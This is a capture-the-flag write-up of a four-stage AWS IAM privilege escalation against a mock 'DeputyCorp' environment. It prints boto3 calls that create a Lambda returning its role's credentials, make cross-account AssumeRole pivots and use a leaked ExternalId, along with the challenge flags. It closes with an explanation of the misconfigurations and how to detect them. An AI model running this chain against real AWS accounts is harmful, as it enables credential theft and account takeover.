---
title: "DeputyCorp Cloud Integration — AWS IAM Privilege Escalation"
description: "Endpoint: https://web-dac032e81309a592.web.h7tex.com Start creds: AKIAANALYST0000000000 / wJalrAnalystSecretKeyEXAMPLEbPxRfiCY (region us-east-1) Start identity:**…"
event: "h7ctf"
category: "cloud"
categoryLabel: "Cloud"
tags: ["H7CTF 2026","cloud"]
date: "2026-09-26"
teammate: false
source: "H7CTF/cloud/1/writeup.md"
---

**Endpoint:** `https://web-dac032e81309a592.web.h7tex.com`
**Start creds:** `AKIAANALYST0000000000` / `wJalrAnalystSecretKeyEXAMPLEbPxRfiCY` (region `us-east-1`)
**Start identity:** `arn:aws:iam::111111111111:user/analyst` (account `111111111111`)

## Flags

| # | Stage | Flag | Where |
|---|-------|------|-------|
| 1 | recon | `H7CTF{d6cc592f5a2f3db80718}` | `s3://deputy-analyst-scratch/welcome.txt` |
| 2 | passrole | `H7CTF{28f87391f8a228110839}` | `s3://deputy-runner-logs/build.log` |
| 3 | admin | `H7CTF{ea3e1dba8012d76e2648}` | `s3://deputy-flag-vault/flag` |
| 4 | externalid | `H7CTF{1dbe909840d15aabdd63}` | `s3://deputy-crown-vault/flag` |

## Attack chain at a glance

```
user/analyst            (111111111111)
  |  iam:PassRole + lambda:CreateFunction
  v
ci-runner-role          (111111111111)   <- Lambda execution role, trust: lambda.amazonaws.com
  |  sts:AssumeRole (cross-account, no ExternalId)
  v
partner-admin-role      (999999999999)   <- confused deputy across the org boundary
  |  sts:AssumeRole + ExternalId (read out of partner-config.json)
  v
partner-secure-role     (999999999999)   <- the "hardened" role
```

---

## Stage 1 — recon

`iam:Get*` / `iam:List*` on `*` means full read access to IAM config, so start by
asking the key what it is.

```
sts:GetCallerIdentity -> arn:aws:iam::111111111111:user/analyst
iam:ListUserPolicies  -> ["analyst-permissions"]
```

`iam:GetUserPolicy` returns the key's entire blast radius:

```json
{
  "Statement": [
    { "Action": ["sts:GetCallerIdentity"], "Resource": "*" },
    { "Action": ["iam:Get*", "iam:List*"], "Resource": "*" },
    { "Action": ["s3:ListAllMyBuckets"], "Resource": "*" },
    { "Action": ["lambda:CreateFunction", "lambda:InvokeFunction",
                 "lambda:GetFunction", "lambda:ListFunctions"], "Resource": "*" },
    { "Action": ["iam:PassRole"],
      "Resource": "arn:aws:iam::111111111111:role/ci-runner-role" },
    { "Action": ["s3:GetObject", "s3:ListBucket"],
      "Resource": ["arn:aws:s3:::deputy-analyst-scratch",
                   "arn:aws:s3:::deputy-analyst-scratch/*"] }
  ]
}
```

`lambda:CreateFunction` + `iam:PassRole` together is the whole game — creating a
function *is* passing a role, so any principal holding that pair can assume any
role it is allowed to pass, just by pointing a function at it.

`s3:ListAllMyBuckets` names the estate:

```
deputy-analyst-scratch   <- granted
deputy-runner-logs
deputy-flag-vault
deputy-crown-vault
```

`deputy-analyst-scratch/welcome.txt` is the onboarding note and the first flag,
and it points at the next hop:

> Welcome, analyst.
> `H7CTF{d6cc592f5a2f3db80718}`
> Onboarding: our deploys run through a Lambda that executes as ci-runner-role.
> Check what YOU can do (get your inline policy) and what the runner can do.

`iam:ListRoles` shows exactly one role, and its trust policy is the constraint
that shapes stage 2:

```json
{ "Principal": { "Service": "lambda.amazonaws.com" },
  "Action": "sts:AssumeRole" }
```

The runner is only assumable *by Lambda*, so `sts:AssumeRole` on it directly is
denied. The Lambda path is the only way in — which is precisely what the
`lambda:CreateFunction` grant enables.

## Stage 2 — passrole

Read the runner's own permissions first (`iam:GetRolePolicy` →
`ci-runner-permissions`) to confirm it is worth having:

```json
{
  "Statement": [
    { "Action": ["sts:AssumeRole"],
      "Resource": "arn:aws:iam::999999999999:role/partner-admin-role" },
    { "Action": ["s3:GetObject", "s3:ListBucket"],
      "Resource": ["arn:aws:s3:::deputy-runner-logs", "..."] },
    { "Action": ["logs:*"], "Resource": "*" }
  ]
}
```

Now perform the pass. `CreateFunction` with the runner as the execution role:

```python
lam.create_function(
    FunctionName="analyst-helper",
    Runtime="python3.11",
    Role="arn:aws:iam::111111111111:role/ci-runner-role",
    Handler="lambda_function.lambda_handler",
    Code={"ZipFile": "def lambda_handler(e, c):\n    import os\n    return os.environ\n"},
)
# -> State: Active   (PassRole succeeded; trust policy allows lambda.amazonaws.com)
```

Invoking it returns the role's temporary credentials:

```
AWS_ACCESS_KEY_ID     = ASIAA69804EA2F5661E6
AWS_SECRET_ACCESS_KEY = sk/a-qYYEX8qs14VrwdRPZLGg80M-m-Jcg5
AWS_SESSION_TOKEN     = tok/YDFltwzCAA63LEQhGCGOfuIIWGyuFQnNFB0Et0OFAtCTARvKMDQxd5ztP2gQj086
```

Confirmed: `arn:aws:sts::111111111111:assumed-role/ci-runner-role/awslambda-analyst-helper`.

The runner's private log bucket is now readable — `deputy-runner-logs/build.log`:

```
[ci-runner-role] nightly deploy ok
internal marker: H7CTF{28f87391f8a228110839}
```

## Stage 3 — admin (cross-account)

The runner is already a cross-account bridge. One call, no caveats:

```python
sts.assume_role(
    RoleArn="arn:aws:iam::999999999999:role/partner-admin-role",
    RoleSessionName="analyst-pivot",
)
# -> ASIA909C5867C21C073D / sk/ZaH2qW-tPBaetP-L1ADk-nY8FkN6zDtC / tok/em6TbpX-...
```

`arn:aws:sts::999999999999:assumed-role/partner-admin-role/analyst-pivot`.
Note the trust policy accepted a bare `sts:AssumeRole` with **no `ExternalId`**
— the partner boundary was open.

Inside account `999999999999` the guardrails are split by role:

* `deputy-crown-vault` → `AccessDenied: s3:ListBucket`
* `deputy-flag-vault` → `flag`, `partner-config.json`

```
$ s3 cp s3://deputy-flag-vault/flag -
H7CTF{ea3e1dba8012d76e2648}
```

`partner-config.json` is the real find — it names the last hop *and* its secret:

```json
{
  "partner": "DeputyCorp",
  "secure_role": "arn:aws:iam::999999999999:role/partner-secure-role",
  "external_id": "Dc-2026-8f31a97c4b2e",
  "note": "partner-secure-role is our HARDENED role — callers must pass this ExternalId."
}
```

## Stage 4 — externalid

The hardened role lives behind an `ExternalId` condition. The ExternalId is
only readable by the role it protects, so stage 3 is a prerequisite — the
"hardening" is self-referential and collapses the moment you are admin.

```python
sts.assume_role(
    RoleArn="arn:aws:iam::999999999999:role/partner-secure-role",
    RoleSessionName="analyst-final",
    ExternalId="Dc-2026-8f31a97c4b2e",
)
# -> ASIA3C1D2DB04609F0CD / sk/sPyjCtRZ33ZtQVuF8lgc6FAAG3wM1cog / tok/vh3hULgMpyc...
```

`arn:aws:sts::999999999999:assumed-role/partner-secure-role/analyst-final`, and
`deputy-crown-vault` finally opens:

```
$ s3 cp s3://deputy-crown-vault/flag -
H7CTF{1dbe909840d15aabdd63}
```

---

## Why the integration was careless

Every stage is a single missing control, and each one is a real-world bug class:

1. **`iam:PassRole` with no `iam:PassedToService` condition.** Combined with
   `lambda:CreateFunction` this is a textbook privesc primitive: the principal
   cannot call `sts:AssumeRole` on the runner, but it can borrow the Lambda
   service principal's right to. Least privilege here means scoping the
   condition —
   `"Condition": {"StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}}`
   — and never handing `lambda:CreateFunction` to a human or integration key.
2. **A CI role that can assume across the org boundary.** The runner's only
   interesting power is `sts:AssumeRole` into `999999999999`, so it is a
   confused-deputy relay. A deploy role should not be able to leave the account.
3. **The cross-account trust policy had no conditions at all.** No
   `ExternalId`, no `aws:PrincipalOrgID`, no `aws:SourceArn`/`aws:SourceAccount`.
   Any principal the runner could name could walk in.
4. **The ExternalId was stored somewhere the protected role could read.** An
   `ExternalId` is only a control against *confused deputies* — it is a shared
   secret, not a cryptographic boundary. `partner-config.json` in a bucket the
   admin role can read means anyone who reaches admin reaches the hardened role.
   It belongs in Secrets Manager with a resource policy, or distributed
   out-of-band.
5. **Read-only IAM introspection is still recon.** `iam:Get*`/`iam:List*` on `*`
   hands over the entire topology, including trust policies — the whole chain
   above was planned using only read calls before a single write happened.

Detection: alert on `iam:PassRole` and on `lambda:CreateFunction` where the
target role is not already a known CI execution role, and on `AssumeRole`
crossing an account boundary. This chain is short, loud in CloudTrail, and
entirely preventable.

## Artifacts

* `solve.py` — full end-to-end reproduction of all four stages
* `iam.py` — signed-request helper (boto3 against the mock endpoint)

Note: the mock implements only a subset of the IAM API (`ListRoles`,
`GetRole`, `GetUserPolicy`, `GetRolePolicy` respond; `ListUsers`,
`ListPolicies`, `ListGroups` return empty and `UpdateFunctionConfiguration`
is 405). `CreateFunction` is not idempotent in the mock, so `solve.py` uses a
timestamped function name per run.
